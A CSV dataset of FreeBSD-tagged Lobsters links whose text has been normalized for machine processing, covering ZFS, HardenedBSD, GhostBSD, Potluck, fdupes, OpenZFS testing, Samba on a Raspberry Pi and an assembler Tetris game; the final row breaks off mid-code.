ID,Source,Tag_Code,Tag_Name,Title,Url,ProcessdedTitle,WeightedContent,Content
1,Lobsters,freebsd,FreeBSD,Bringing ZFS Pool Checkpoints to FreeBSD Bootloader,https://oshogbo.vexillium.org/blog/79/,bringing zfs pool checkpoint freebsd bootloader,checkpoint zfs vermaden,almost two year ago wrote blog post checkpoint zfs hide big fan said two year still feel underappreciated feature zfs world decided something currently one best practice upgrading operating system use boot environment great feature managing multiple kernel userlands based juggling zfs datasets mounted dataset version system unfortunately boot environment limitation example upgrade zfs pool may able use older version system anymore big advantage boot environment good tool two main tool beadm created vermaden bectl currently freebsd base system tool allow u create manage boot environment boot environment also easily managed bootloader boot choose boot environment want use another way upgrading box use zfs snapshot case snapshot datasets system something go wrong roll back previous version use upgrading database among task upgrade create snapshot sqls change scheme something go wrong simply rollback state datasets technique handy also subtle nuance example add datasets remove upgrade pool upgrade process none operation rollbacked zpool checkpoint interesting based dataset whole pool thanks rollback pool upgrade dataset creation deletion ability handy complicated upgrading process zpool checkpoint remembers whole transaction group txg mean data disappear long checkpoint exists another caveat rewind checkpoint pool imported mean root zfs able rewind system booted also unable rewind singleuser mode pool already imported could boot separate file system rewind better friendly reminder rewind checkpoint lose data careful see zfs give u lot option securely upgrade operating system boot environment snapshot checkpoint great feature need tool help u use otherwise great feature hope support freebsd bootloader user use checkpoint guess time upgrade
3,Lobsters,freebsd,FreeBSD,HardenedBSD August 2020 Status Report and Call for Donations,https://hardenedbsd.org/article/shawn-webb/2020-08-15/hardenedbsd-august-2020-status-report-and-call-donations,hardenedbsd august status report call donation,,last month largely quiet one restarted work porting fiveyearold work code pointer integrity cpi project hardenedbsd chiefly started forwardporting libc rtld bit cpi project need look llvm compilerlinker enhancement need able apply safestack shared object application binary forwardporting work support effort infrastructure settled churning normally happily still working bandwidth issue hope new fiber line ran end september part status report issuing formal call donation aiming usd newer selfhosted gitea server hope purchase new server end last year migrated u away github sourceoftruth hardenedbsd source code port tree server hosting source rather ancient one dell insufficient cpu ram formally calling donation go towards newer server host code wanted selfhost source couple reason single sourceoftruth control monitor guarantee security provide unique access hardenedbsd ecosystem provide tor onion service need plan deploy mixnets anonymization service privacyrelated tech reaching hardenedbsd infrastructure unique way use gitea code sharing platform similar look feel github provides bug reporting wiki pull request feature given hardenedbsd downstream freebsd share history greater twenty five year place huge burden gitea hard time handmedown dell system desperately need upgrade appreciate every type contribution whether financial code documentation advocacy otherwise hardenedbsd would exist without continued help support community
4,Lobsters,freebsd,FreeBSD,PostgreSQL on FreeBSD advancements,https://www.youtube.com/watch?v=fdbO5Jpopbg&list=PLeF8ZihVdpFedccMdpBtBxniM3Lm-fVpT,postgresql freebsd advancement,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature postgresql freebsd thomas munro youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature postgresql freebsd thomas munro youtube
5,Lobsters,freebsd,FreeBSD,GhostBSD 20.08.04 Available,https://ghostbsd.org/20.08.04_release_announcement,ghostbsd available,upgrade done already download http wwwghostbsdorgdownload,happy announce availability ghostbsd release come kernel o software application update updated mate desktop new interesting feature boot environment backup update upgrade done already uname u output pkg update fsudo pkg upgrade fnote package upgrade pkg update station datewhere download image checksum hybrid iso dvd usb torrent available http wwwghostbsdorgdownload writing iso usb stick bsd dd linux dd ofdevsdc mac dd
6,Lobsters,freebsd,FreeBSD,FreeBSD Virtual Data Centre with Potluck – DevOps and Infrastructure as Code,https://honeyguide.eu/posts/virtual-dc1/,freebsd virtual data centre potluck devops infrastructure code,content introduction yes freebsd lack kubernetes really usage potluck potluck imagesflavours open ticket pull request github page architecture component freebsd package called minipot existing system used step installing pot installing pot step optional storage configuration network storage setup using minio minio setup guide mount bucket compute node via etcfstab,content article split three part introduction yes freebsd lack kubernetes really one main complaint freebsd lack docker kubernetes turn seen inability use freebsd platform bleeding edge concept like micro service scaleout container orchestration sure linux ecosystem diverse broader selection toolstacks choose article show freebsd also contains complete selection tool required run virtual datacenter vdc application used alternative exist port package collection well eg addition minio distributed storage solution like ceph moosefs usage potluck one major building block use quickly setting environment also provisioning containerised service potluck imagesflavours beside showcasing power freebsd platform article series give idea concept potluck admittedly still early stage potential complex container image set different interdependent container image like nomad consul traefik freebsd package collection individual application storage step article enough get basic configuration vdc running depending network speed setting core configuration consul nomad traefik step potluck image take minute point advanced feature like highavailability configuration exposed imagesflavours yet plan clearly improve coming week month last least feel free open ticket pull request github page come across bug requirement architecture component vdc built following tool application please note testing pot nomad consul traefik one system freebsd package called minipot existing simply installed pkg install minipot minipot excellent yet simple demonstration basic setup article aim lay foundation setup somebody transform actual production environment system used assume least two physical virtual host configuration consulnomadtraefik server could run service different host well course least one nomad compute node client probably one node real life step installing pot installing pot simple run following command host pkg install pot echo bootloaderconf sysrc potenable yes pot init v mandatory needed want allow pot thus also nomad limit resource usage jail ensure setting enabled reboot host step optional storage configuration network storage note setting environment described chapter optional also run two example nomad job without network storage since example cluster one compute node anyway leave permanent mountin storage test purpose completely basic idea service orchestration distributing service across different host based capacity demand requirement container jail created compute node started destroyed stopped service require read potentially write access storage life beyond lifetime service host eg database file data file directory necessary mount outside storage container initialisation principle network file system like nfs used make sure share mounted place host potentially could selected run service setup using minio since scale storage good fit scale compute platform could follow minio setup guide create distributed storage cluster simply mount bucket compute node via etcfstab please note due bug able chmod directory actually readable nonroot user within jail eg nginx user example job therefore mount bucket appropriately lax umask permission like etcfstab entry need add node assuming otherwise followed two article set minio testbucket fuse rw netdev allowother late urlhttps usepathrequeststyle enablenoobjcache nocheckcertificate usexattr complementstat
7,Lobsters,freebsd,FreeBSD,Finding File Duplicates with fdupes(1) on FreeBSD,https://rubenerd.com/finding-file-duplicates-with-fdupes/,finding file duplicate fdupes freebsd,fdupes freebsd port pkgsrc dupeguru,today learned mitlicenced fdupes adrian lopez performs hashed byteforbyte file comparison present list duplicated file work well use big shoutout ehaupt maintaining freebsd port ef bonn university maintaining pkgsrc mac use excellent open source dupeguru gui application need find duplicate across terabyte data one freebsd microservers weekend wanted tool could easily run detached screen session fdupes fit bill like buff platypus took zfs snapshot dataset case thing went pearshaped needed roll back set autodelete duplicate target directory substitute pool dataset directory required zfs snapshot pooltank backup echo delete data fdupes r n directory want identify duplicate fdupes r directory dupeslog want prompt find fdupes r directory someone probably tell zfs deduping applicable case quick dirty job clean recursively rsync mess halfasleep use compression pool anyway could cleaned let
8,Lobsters,freebsd,FreeBSD,BSD Gaming is Improving – Proton on FreeBSD,https://www.youtube.com/watch?v=wfvbyWGkRW0,bsd gaming improving proton freebsd,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature bsd gaming improving proton freebsd youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature bsd gaming improving proton freebsd youtube
9,Lobsters,freebsd,FreeBSD,Introduction to ZFS – Place to Start,https://www.servethehome.com/an-introduction-to-zfs-a-place-to-start/,introduction zfs place start,openzfs zfs filesystem logical volume manager copyonwrite cow filesystem snapshot logical block address use cmr zfs smr fragmentation primer zfs pool design vdev pool mirror degraded single raidz parity unraid raidz raid resilver drive parity add however slower performance end need speed iop throughput full pool slower ultimately get half second borrow zfs community western digital announced samsung evo plus block sector allocation unit size record size block running database server sector ashift ssds story muddies arc arc lru reddit post relatively slow old wisdom ram zil slog transaction group txg sync write zil zfs intent log twice write amplification slog worth noting zil zfs write cache final word building lab part planning truenas vmware esxi,truenas homepage zfs become increasingly popular recent year zfs linux zol pushed envelope exposed many newcomer zfs fold ixsystems adopted newer codebase called openzfs codebase truenas core purpose article help heard zfs yet opportunity research hope leave better understanding work way knowledge key decisionmaking process feel zfs something worth considering organization zfs zfs filesystem unlike file system also logical volume manager lvm mean zfs directly control bit block file stored hard drive also control hard drive logically arranged purpose raid redundancy zfs also classified copyonwrite cow filesystem mean zfs cool thing like snapshot normal filesystem like ntfs could snapshot thought like sound photograph something point time cow filesystem work however important implication need discus open zfs logo hard drive work piece data stored logical block address lbas zfs aware lbas specific file stored let u say need write file big enough fit block going store file lba considered sequential write block stored directly next spinning hard drive ideal write head move track wd red pro na top use cmr zfs smr let u say make change file part stored lba need modified write change zfs overwrite part file stored instead write block lba lba kept asis snapshot keeping expires allows u current version file previous one storing difference however next time go read file back read head spinning hard drive need read lba go track lba stored read go back track lba stored phenomenon called fragmentation primer zfs pool design make zfs pool easier understand going focus using small storage container may around house shop continue worth defining term vdev virtual device logical grouping one storage device pool logically defined group built vdevs zfs customizable therefore many different type configuration vdevs think construction zfs pool visualizing following graphic nested storage container starting smallest container size drive see visualization two drive larger container two larger container vdevs single largest container pool configuration would pair drive mirror mean one drive fail either vdev pool would continue function degraded state two mirror vdev one bad drive however drive single vdev data entire pool lost redundancy pool redundancy zfs vdev layer one vdev fails enough information rebuild missing data two mirror one vdev drive failed next need define raidz various level raidz raidz way putting multiple drive together vdev storing parity fault tolerance zfs dedicated parity drive like unraid instead store parity across drive vdev amount parity spread across drive determines level raidz way similar traditional hardware raid make raidz better approach mirrored configuration matter drive fails raidz drive equal partner whereas mirrored configuration mirrored vdev separate entity benefit raidz come cost performance however mirrored pool almost always faster raid z raidz similar traditional raid raidz one drive worth parity word lose one drive pool continue function raidz need minimum drive per vdev even drive raidz vdev drive add however longer take resilver rebuild increased time increase risk data second drive failure process would destroy pool zfs resilver data still use live recovery implication disk working harder usual process increase chance second drive failure data still accessible production reading parity data existing member vdev writing new disk pool single raidz vdev vdev akin raid configuration drive worth parity stored across device lose two drive per vdev pool still function adding parity drive increase calculation required mean need processing performance operate array pool single raid vdev finally vdev provides three drive worth parity lose three drive per vdev pool still function drive parity add however slower performance end need minimum four use least five drive build vdev need speed two way measure speed fastness iop throughput raidz drive give throughput actual read write speed see transferring file however ever tried run multiple file copy window simultaneously may noticed slower get always get slower constant rate try disk get exponentially slower disk many inputoutput operation per second iop raidz scale throughput disk add scale iop generally mean raidz traditionally best choice io intensive workload amount iop roughly limited slowest member vdev exclude caching zfs virtualization discussing highly dependent io earlier discussed zfs cow filesystem suffers data fragmentation direct performance implication stem fact full pool slower ultimately get write speed zfs directly tied amount adjacent free block write pool fill data fragment fewer fewer block directly adjacent one another single large file may span block scattered surface hard drive even though would expect file sequential write longer drive full seagate mobile hdd crystal disk mark performance graphic see seagate mobile drive tested crystaldiskmark mb sequential read writes also see start random io speed fall meant illustrate performance impact data fragmentation additionally see latency lookup take half second limited iop order fast virtualization workload traditional hard drive need many disk order compensate slowness would uncommon see pool constructed vdevs mirrored drive additionally wisdom borrow zfs community pool fill sequential writes become increasingly difficult accomplish due fragmentation slow nonlinear way general rule thumb capacity pool noticeably slower capacity capacity pool start become slow zfs actually change write algorithm ensure data integrity slowing ssds come radically change game work differently physical layer read write head flying around spinning disk back forth trying find data physical limitation diskbased drive way ssds read write nonsequential data much faster suffer penalty rule nearly severely fragmentation hurt performance degree samsung evo plus ssd hard drive increased capacity leapsandbounds past couple decade seen hard drive grow single gigabyte capacity last year western digital announced terabyte drive coming changed ability io hard drive old new alike still bound physical limitation even new monster really able random iop four time year ago samsung evo plus pictured however evo plus crystaldiskmark result review receive enough feedback another piece talk tuning performance zfs block sector finally need briefly explore additional topic underlying storage configuration window computer plug new hard drive flash drive need format assign drive letter use similarly finish creating pool zfs need create dataset order actually start using format flash drive window asks specify allocation unit size window formatting screen zfs term called record size value represents maximum size block block assembles piece data logical grouping truenas core define record size pool level child datasets inherit record size set pool also specify different record size create additionally modify record size point however affect new data written pool existing data truenas core creates datasets record size default meant wellrounded decision depending workflow may wish increase decrease value running database server example would make sense set value smaller number record size example would allow transaction database written directly disk rather waiting fill entire record default configuration general rule thumb smaller record size offer lower latency whereas larger one offer higher overall throughput physical representation hard drive photo courtesty uma recordsize span sector native hard drive sector lowestlevel piece storage puzzle closest thing physical embodiment data inside storage medium going go zfs need aware information order make intelligent decision read write data disk tell sector size providing ashift value truenas core pretty good job automatically modern disk sector size drive zfs need ashift value older drive would use ashift value ssds story muddies report o drive reality function internally drive device would require manually assign ashift value use unsure better high low small ashift value cripple performance arc zfs adaptive replacement cache arc algorithm cache file system memory type cache read cache direct impact write performance traditional file system lru least recently used cache used way cache work open file computer put file cache close reopen file load cache rather hard drive lru cache evict least recently used item cache first let u say file talking excel spreadsheet assume opened file got cache excel file something access frequently throughout workday make change close go work powerpoint write email lru cache potentially run space evict excel file cache open later day rather reading cache load disk cache usually much larger office document using conceptual example arc differs take recent eviction history account time file evicted arc occurrence logged algorithm give weight log file evicted cache lower priority evicted level arc extension zfs arc file evicted arc moved rather removed resides disk disk rather system memory since ram expensive feature useful way expand caching capability advent nvme optane relatively high speed large caching achieved come cost however since arc need know file stored store information ram according reddit post oracle employee formula calculating arc header mapping size byte zfs recordsize byte byte arc header size byte let u make sense purpose use truenas default block nvme ssd byte would pretty common configuration choice lowerend vm storage box ram system arc space would wasted mapping would entire rest system would want minimum ram would recommended nvme v software ram disk want keep data cached arc tiered approach comparison attempt illustrate fact even using software ramdisk driver pc relatively slow faster samsung old wisdom always ram ultimate goal prevent pool many read arc directly cache writes speed write performance freeing drive constantly read disk zil slog explain zil slog must first explain data written zfs pool write disk occurs must first pas system memory transaction group txg created zfs asynchronously commit data pool meaning check balance ensure data got pool successfully event crash power failure corruption occurred lost data written zfs also write data block synchronously force zfs setting syncalways flag pool addition sync write commits writes zil zfs intent log parallel system memory normal txg written pool successfully data zil erased system crash power interrupted data remain zil since system memory volatile zil considered insurance policy write commits speed writes however tied speed zil default zil life pool logically separate place ever read one scenario crash power failure every time system restarted reimport zfs pool proceeding pool reimported zfs look see remaining data written zil mean writes yet committed disk read data commit new txg pool mean sync write data written disk pool twice called write amplification slow write commits pool crawl sync writes high cost cutting write performance half intel optane dc cover slog come slog separate piece hardware act dedicated place zil live separate hardware prevents write amplification effect pool also allows put zil much faster device important writes still limited speed slog transaction especially sensitive disk latency important throughput iop slog device reason recommend intel optane use sync writes requirement intel optane dc performance latency zoom worth noting zil zfs write cache pool write speed always faster asynchronous writes even using slog using sync writes feel data sensitive enough require sync writes buy slog final word spent time article discussing key concept surrounding zfs hope helped provide provide necessary knowledge reference get started world zfs go build lab go bid new storage solution open source tremendous resource considered covered everything piece special allocation class openzfs feature allow accelerate metadata spinning drive flash storage additionally use get betterperforming deduplication still new feature openzfs yet tested vetted viability value additionally zfs onthefly compression native encryption support wholehost new feature actively developed hope follow introduction zfs piece content future around zfs new thing come want put action lab check series starting building lab part planning truenas vmware esxi
10,Lobsters,freebsd,FreeBSD,Call for Testing for Vendor OpenZFS 2.0 in FreeBSD,https://lists.freebsd.org/pipermail/freebsd-hackers/2020-July/056338.html,call testing vendor openzfs freebsd,cft vendor openzfs week reminder memdisk image mmacy freebsdorg http http http githubcommattmacynetworkinggit http githubcomzfsonfreebsdzofgit information freebsdhackers mailing list,cft vendor openzfs week reminder memdisk image matthew macy mmacy freebsdorg wed jul utc wednesday july issued initial call testing update head vendored openzfs like give user roughly month test merging tentative merge date august hope terribly controversial point really rest user non platform test avoid unpleasant surprise next time update tree following merge memdisk image found http using platform listed would inclined test image work let u know alternatively still build following instruction review merging base found http nb zpool upgrade unless willing live without ability ever rollback legacy zfs kmod checkout updated head git clone http githubcommattmacynetworkinggit b projectsopenzfsvendor freebsd checkout updated openzfs syscontrib git clone http githubcomzfsonfreebsdzofgit b projectsopenzfsvendor freebsdsyscontribopenzfs build world kernel whatever usual configuration possible openzfs kmod backward compatible cmd utils head common operation work existing tool new kmod projectsopenzfsvendor branch zof ozfs library backward compatible zfs kmod head although ideally one would test separate boot environment interoperability allow one rollback without much difficulty thanks advance time information freebsdhackers mailing list
11,Lobsters,freebsd,FreeBSD,Install and Configure FreeBSD on Raspberry Pi,https://cromwell-intl.com/open-source/samba-active-directory/freebsd-raspberry-pi.html,install configure freebsd raspberry pi,installing freebsd raspberry pi freebsd raspberry pi building active directory server samba running freebsd free server software free operating system set needed dns infrastructure jump back start install freebsd raspberry pi jump next step nt using freebsd raspbsdorg freebsdorg freebsdorg dd iffreebsd rpi img ofdevsd raspbsdorg df ht setting user account modifying radvd rfc ifconfig netstat r traceroute wwwgooglecom wwwgooglecom configuring syslog egrep v etcsyslogconf cat etcrsyslogdfqdnconf systemctl restart rsyslog configuring time zone tzsetup tzsetup americayellowknife mounting root file system posix acls kenv mount grep vartmp mount u noatime vartmp mount grep vartmp mount u noatime vartmp mount grep mount u noatime echo mount grep freebsd access control list building linux kernel root file system modified tool job sync sync sync mount f u ro dumpfs grep flag tunefs n disable tunefs enable dumpfs head tunefs p freebsd disk tuning adding samba bind pkg search bindnamedsamba package management bsd linux solaris bind dlz dns back end bind version supported starting pkg install next step slave dns server linux topic,installing freebsd raspberry pi freebsd raspberry pi building active directory server samba running freebsd free server software free operating system set needed dns infrastructure existing bind master primary dns server next step put together system make slave secondary dns server initial step building sambabased active directory server freebsd running raspberry pi must take extra step stage samba requirement file system security requirement posix access control list along admittedly uncommon combination operating system hardware mean modify file system jump back start overview project install freebsd raspberry pi jump next step nt using freebsd initially used raspberry pi model b project broadcom soc system chip includes mhz processor mb ram videocore iv gpu cpu performance like mhz pentium ii bear mind initial testing experimentation try run enterprise raspberry pi model b raspberry pi comparison cpu faster clock time cpu performance would get samba suite service running faster see later step something like samba process smbd process winbind process running simultaneously core would definitely help still nt run entire enterprise one raspberry pi cost u least get several set replication load balancing failover seriously probably nt want deploy raspberry pi b model usb port mbps ethernet port hdmi video audio output power something like smart phone charger ideally one provides current usual later moved project raspberry pi provides cpu core server process singlecore raspberry pi model b download freebsd image raspbsdorg freebsdorg also page freebsd raspberry pi freebsdorg although page seems updated much le frequently linux writing image bsd system one disk microsd card appear something like device inventory change either linux bsd look kernel ring buffer dmesg tail see appeared plug microsd card downloaded image uncompressed wrote onto memory card dd careful select correct device ran df first using lvm would run pvscan inventory disk holding data get listing device file devsd plug usb device sd memory card see added several disk system devsda sdf saw two new device sdg card ibm mbr partition table defining one partition spanning device vfat file system partition write image onto entire device careful choose correct target location change sdx appropriate following used sdg nt destroy data overwriting wrong device dd iffreebsd rpi img ofdevsdx connected ethernet cable power supply waited boot saw get ip address dhcp server connected ssh user raspberry password raspberry image raspbsdorg could run su become root without password resulting file system resizes root partition fill device first boot disk gb microsd card df ht filesystem type size used avail capacity mounted ufs devfs devfs dev msdosfs bootmsdos ufs tmp ufs varlog ufs vartmp setting user account created user account uidgid system copied vimrc cshrc ssh place also added wheel group modifying etcrcconf main linux system one interface interior network hostname router resolving address run radvd router advertisement daemon forward internet another interface connected cable modem advertises prefix internally per rfc freebsd etcrcconf file originally contained line along several others hostname raspberrypi dhcp ntpdenable yes syslogdenable replaced line following customize hostname networking original hostname raspberrypi hostname freebsd original dhcp inet defaultrouter routerexamplecom routerexamplecom original ntpdenable yes ntpdenable yes original syslogdenable syslogdenable yes restarted networking etcnetstart script found thing worked ifconfig loopback running multicast metric mtu rxcsum txcsum prefixlen prefixlen scopeid inet netmask group lo performnud autolinklocal broadcast running simplex multicast metric mtu rxcsum vlanmtu linkstate ether ae inet netmask broadcast ebff prefixlen scopeid ebff prefixlen medium ethernet autoselect fullduplex status active performnud autolinklocal netstat r routing table internet destination gateway flag netif expire default routerexamplecom ugs link u freebsdexamplecom link uhs localhost link uh destination gateway flag netif expire localhost ugrs default routerexamplecom ugs localhost link uh localhost ugrs link u ebff fe link uhs localhost ugrs link u link uhs link u ebff fe link uhs localhost ugrs traceroute wwwgooglecom routerexamplecom m m m m m m m m m m m m m m m m m m m m m several hop deleted m m m m m m wwwgooglecom routerexamplecom m m m m m m m m m m m m m m m m m m m m m several hop deleted m m m m m m configuring syslog edited etcsyslog commented line sending output file added one line end sending syslog output log collector result egrep v etcsyslogconf include etcsyslogd include usrlocaletcsyslogd syslogd daemon freebsd include hostname message message simply timestamp daemon pid message compare syslog daemon insert hostname timestamp hostname ip address message log collector insert ip address source log collector using rsyslog add new file get resolve name named anything long end conf cat etcrsyslogdfqdnconf preservefqdn systemctl restart rsyslog configuring time zone set time zone tzsetup time date reported utc local time defined many choice defined file usrsharezoneinfo something like tzsetup refer hierarchy file yukon could something like tzsetup americayellowknife also recall configured ntp daemon run kerberos requires time synchronization mounting root file system posix acls samba requires file system support posix accesscontrol list modified etcfstab addition highlighted yellow bootmsdos msdosfs rw noatime ufs rw noatime acls md tmp mf rw noatime acls md varlog mf rw noatime acls md vartmp mf rw noatime acls however mount command next boot showed root file system mounted incompatible option others requested acls option following line went varlogmessages reboot freebsd kernel warning acls flag f conflict acls mount option option ignored mysterious kenv showed kernel environment looked right kenv line autobootdelay bootfile kernel console uboot currdev interpret ok kernel kernel kernelname bootkernelkernel loaddev loaderconffiles bootloaderconf bootloaderconflocal modulepath bootkernel bootkernel bootmodules bootdtb prompt loader twiddledivisor vfsrootmountfrom ufs vfsrootmountfromoptions rw noatime acls tried creating new file bootloaderconflocal content vfsrootmountfromoptions rw acls noatime added option kernel environment desired effect file system could interactively modified mount grep vartmp vartmp ufs local noatime softupdates acls mount u noatime noacls vartmp mount grep vartmp vartmp ufs local noatime softupdates mount u noatime acls vartmp vartmp ufs local noatime softupdates acls root file system mount command change option ran error warning message exited status however attribute change mount grep ufs local noatime journaled softupdates mount u noatime acls echo mount grep ufs local noatime journaled softupdates problem root file system raspberry pi image set always use option acls acls use posix acls enabled explained freebsd access control list page mounttime flag set persistent manner modifying flag superblock file system header flag set used modified without unmounting file system unmount root file system page explains security want mark file system precisely reason unable proceed intruder gain root access disable acl protection acls enforced within superblock prevent user otherwise unlimited power modifying protected component file system agree logic analogous reason linux able disable securityenhanced linux protection kernel running forced reboot system disable boot time requiring physical access console notice red hat chooses build kernel allow changed run time decreasing security making easy help customer solve problem kernel build configuration variable securityselinuxdisable mean disabled running kernel build configuration interface security option nsa selinux support nsa selinux runtime disable building linux kernel samba requires posix acls part database maintained us acls part persistent file system varlog vartmp tmp based ram md pseudodevice root file system modified tunefs tool job typical server hardware could reboot request boot singleuser maintenance mode could boot medium neither possible plugged hdmi cable tv plugged usb keyboard rebooted problem early boot environment nt see usb keyboard could nt send key stop automated boot ask boot singleuser mode manually shut network service using lsof see remained manually unmounted bootmsdos varlog vartmp tmp file system manually terminated process could getty process respawn finally forced change readwrite readonly sync sync sync mount f u ro could use tunefs disable acl enable flag file system dumpfs verify worked dumpfs grep flag flag softupdatesjournal tunefs n disable tunefs acls cleared tunefs filesystem reloaded tunefs enable tunefs posix acls set tunefs filesystem reloaded dumpfs head magic time fri feb superblock location id ncg size block bsize shift mask fsize shift mask frag shift fsbtodb minfree optim time symlinklen maxbsize maxbpg maxcontig contigsumsize nbfree ndir nifree nffree bpg fpg ipg unrefs nindir inopb maxfilesize sbsize cgsize csaddr cssize sblkno cblkno iblkno dblkno cgrotor fmod ronly clean metaspace avgfpdir avgfilesize flag softupdatesjournal acls fsmnt volname swuid providersize c c nbfree ndir nifree nffree tunefs p tunefs acls enabled tunefs acls n disabled tunefs mac multilabel l disabled tunefs soft update n enabled tunefs soft update journaling j enabled tunefs gjournal j disabled tunefs trim disabled tunefs maximum block per file cylinder group e tunefs average file size f tunefs average number file directory tunefs minimum percentage free space tunefs space hold metadata block k tunefs optimization preference time tunefs volume label l soft update mechanism drastically improves file system performance buffer metadata update memory cache detail available freebsd disk tuning page adding samba bind ran space tmp initial package updating umounted let use root partition end nt anything left tmp need clean remounting later ran space pkg search commented line etcfstab defining tmp mb space tmp nt enough rambased memory device faster limited size could make larger ram already limited platform nt package literally named samba bind named package available different version version number name pkg search bindnamedsamba command line tool bind delv dig host nslookup bind dns suite updated dnssec bind dns suite updated dnssec bind dns suite updated dnssec bind dns suite updated dnssec rrdtool frontend bind statistic test bind semantics socket nsupdate utility gsstsig support onaccess antivirus filter samba free smb cifs client server unix shared lib samba package netbios name lookup tool samba ftplike client free smbcifs addc server client unix free smbcifs addc server client unix ok package bind called bind named package management bsd linux solaris initially installed bind samba went everything follows found samba support bind samba us dynamically loadable zone dlz accessed ad schema must compatible combination bind samba information samba page bind dlz dns back end bind version supported starting bind samba bind samba bind samba bind samba let install latest available version samba latest available compatible version bind pkg install updating freebsd repository catalogue freebsd repository uptodate repository uptodate following package affected checked new package installed package deleted number package installed process require mib space mib downloaded proceed action yn fetching mib fetching mib fetching kib package deleted many installation deleted openldap client package successfully installed edit usrlocaletcopenldapldapconf change systemwide client default try man ldapconf visit openldap faqomatic http wwwopenldaporgfaqindexcgi information installation deleted message bind requires configuration rndc including secret key easiest secure way configure rndc run rndcconfgen generate proper conf file new random key appropriate file permission usrlocaletcrcdnamed script installation deleted message start http configuration relevant database log provisioning script usrlocalbinsambatool additional documentation check http key bind automatically generated first time started key stored usrlocaletcnamedbrncdkey use control bind program rndc probably use script usrlocaletcrcdnamed run argument see choice parameter start stop restart reload status cover need also added lsof vim next step next step turn new freebsd system slave dns server raspberry pi running freebsd bind samba software installed linux topic
12,Lobsters,freebsd,FreeBSD,FreeBSD 64bit Assembler (amd64),https://honeyguide.eu/posts/asm64-fbsd/,freebsd assembler,,freebsd many assembler example available web virtually none little bit complex joke aside example show set assembler program us c runtime function also link additional library available portspackages note keyboard handling could smoother would require change go beyond scope small showcase abi freebsd follows aspect linux abi frequently work linux example tutorial mean parameter library function passed order exluding float build program little shell script us system compiler llvm link needed library note svgalibprograms need run root frame parameter frameheight equ framewidth equ frameborderwidth equ framebeginningx equ framebeginningy equ nextpieceframeheight equ nextpieceframewidth equ nextpieceframeborderwidth equ nextpieceframebeginningx equ nextpieceframebeginningy equ boardcolor equ piecesize equ scoreposx equ scoreposy equ gameoverposx equ gameoverposy equ waitfactor usleepms approx usleepms long miss keyboard input short keypresses counted several time waitfactor equ usleepms equ section data gameover db game scorestring db score section bs boardstate resb nextpiecetype resb piecetype resb piececol resb piecepos resb piecepivotpos resb temporarypiecepos resb waittime resb score resw scoreasstring resb extern glwrite glsetfont glsetfontcolors glsetwritemode vgainit vgasetmode vgasetcolor glfillbox glsetcontextvga vgagetkey usleep rand extern exit keyboardinit keyboardtranslatekeys keyboardupdate keyboardkeypressed keyboardclose section text global main main initialization sub call vgainit mov rdi svgalib see vgah call vgasetmode mov rdi need init vgagl mode call glsetcontextvga mov mov mov rdx call glsetfont see man glwrite mov call glsetwritemode mov rdi mov rsi call glsetfontcolors call keyboardinit mov rdi call drawframe call drawnextpieceframe jmp gameinprogres endofgame call delayforlongwhile call displaygameover call delayforlongwhile return previous video mode call keyboardclose mov rdi call vgasetmode finish program simply call return might called within gameinprogress mov rdi call exit drawing function draw rectangle rax begin point rcx height rbx width rdi color drawrect xor rdx rdx clear dx ax division push rdi save colour push rcx save height later mov rcx divisor cx div cx divide begin get ax x dx remainder mov rdi rdx param mov rsi rax param mov rdx rbx width param pop rcx height param fetch stack pop pas colour call glfillbox mov rdi restore colour ret drawframe mov rdi colour gora mov rax framebeginningy framebeginningx mov rcx frameborderwidth mov rbx framewidth frameborderwidth call drawrect lewa mov rax framebeginningy frameborderwidth framebeginningx mov rcx frameheight mov rbx frameborderwidth call drawrect prawa mov rax framebeginningy frameborderwidth framebeginningx framewidth frameborderwidth mov rcx frameheight mov rbx frameborderwidth call drawrect dol mov rax framebeginningy frameheight frameborderwidth framebeginningx mov rcx frameborderwidth mov rbx framewidth frameborderwidth call drawrect ret drawnextpieceframe mov rdi gora mov rax nextpieceframebeginningy nextpieceframebeginningx mov rcx nextpieceframeborderwidth mov rbx nextpieceframewidth nextpieceframeborderwidth call drawrect lewa mov rax nextpieceframebeginningy nextpieceframeborderwidth nextpieceframebeginningx mov rcx nextpieceframeheight mov rbx nextpieceframeborderwidth call drawrect prawa mov rax nextpieceframebeginningy nextpieceframeborderwidth nextpieceframebeginningx nextpieceframewidth nextpieceframeborderwidth mov rcx nextpieceframeheight mov rbx nextpieceframeborderwidth call drawrect dol mov rax nextpieceframebeginningy nextpieceframeheight nextpieceframeborderwidth nextpieceframebeginningx mov rcx nextpieceframeborderwidth mov rbx nextpieceframewidth nextpieceframeborderwidth call drawrect ret drawboardstate mov rbx dec rbx push rbx movzx rdi byte boardstate rbx mov rax rbx call drawonesquare pop rbx cmp rbx jne ret clearboard mov rax framebeginningy frameborderwidth framebeginningx frameborderwidth mov rcx frameheight mov rbx framewidth mov rdi boardcolor call drawrect ret drawtetromino movzx rax byte piecepos movzx rdi byte piececol call drawonesquare movzx rax byte piecepos movzx rdi byte piececol call drawonesquare movzx rax byte piecepos movzx rdi byte piececol call drawonesquare movzx rax byte piecepos movzx rdi byte piececol call drawonesquare ret rax piecenumber rdi color drawonesquare mov bl div bl ah x al mov cx ax calculate offset mov al cl xor ah ah mov bx piecesize mul bx push rax calculate x offset mov al ch xor ah ah mov bx piecesize mul bx pop rdx move fit frame add ax dx add ax framebeginningy frameborderwidth framebeginningx frameborderwidth mov bx piecesize mov cx piecesize jmp drawrect game function gameinprogres mov byte waittime waitfactor call generatenextpiecenumber placenext call updateboard call generatenextpiece call generatenextpiecenumber call setnewdelay call writescore jmp checkifnotend pieceinprogress call clearboard call drawboardstate call drawtetromino call scoretostring call getplayerinput cmp ax ax ffff place next piece cmp ax je placenext call moveonedown cmp ax je placenext jmp pieceinprogress checkifnotend movzx rbx byte piecepos mov al boardstate rbx cmp al boardcolor jne endofgame movzx rbx byte piecepos movzx rax byte boardstate rbx cmp al boardcolor jne endofgame movzx rbx byte piecepos movzx rax byte boardstate rbx cmp al boardcolor jne endofgame movzx rbx byte piecepos movzx rax byte boardstate rbx cmp al boardcolor jne endofgame jmp pieceinprogress getplayerinput movzx rcx byte waittime waitforkey dec cx cmp cx je noinput need run loop frequent polling check every second keyboard pressed miss key event keyboardupdate svgalib push rcx need save loop counter across svgalib call various pushpops superelegant yes know call delayforwhile need ensure nt call frequently otherwise keypress returned call keyboardupdate pop rcx mov rdi scancodecursorleft push rcx call 